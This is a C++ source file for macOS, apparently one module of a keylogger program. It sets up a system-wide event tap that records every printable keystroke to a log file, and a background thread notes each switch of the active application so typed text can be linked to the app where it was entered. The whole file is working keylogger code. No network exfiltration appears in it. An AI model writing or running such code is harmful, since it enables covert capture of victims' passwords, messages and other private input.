#include "keylogger_interface.h"
#include "logger_utils.h"
#include "active_window_utils.h"
#include <ApplicationServices/ApplicationServices.h>
#include <thread>
#include <atomic>

CGEventRef keylogger_callback(CGEventTapProxy, CGEventType type, CGEventRef event, void*) {
    if (type == kCGEventKeyDown) {
        UniChar chars[4];
        UniCharCount actualLength = 0;
        CGEventKeyboardGetUnicodeString(event, sizeof(chars) / sizeof(chars[0]), &actualLength, chars);

        if (actualLength > 0) {
            for (UniCharCount i = 0; i < actualLength; ++i) {
                if (isprint(chars[i])) {
                    logfile << (char)chars[i];
                }
            }
            logfile.flush();
        }
        logfile.flush();
    }
    return event;
}

void track_active_window() {
    std::string lastApp;
    while (true) {
        std::string newApp = get_active_app_name();
        if (newApp != lastApp) {
            logfile << "\n--- Switched to: " << newApp << " ---\n";
            logfile.flush();
            lastApp = newApp;
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void run_keylogger() {
    create_log_file();
    std::thread windowThread(track_active_window);
    windowThread.detach();

    CGEventMask mask = (1 << kCGEventKeyDown);
    CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap,
                                         kCGHeadInsertEventTap,
                                         kCGEventTapOptionDefault,
                                         mask,
                                         keylogger_callback,
                                         nullptr);


    if (!tap) {
        printf("ERROR: Unable to create event tap.\n");
        exit(1);
    }

    CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), source, kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);
    CFRunLoopRun();
}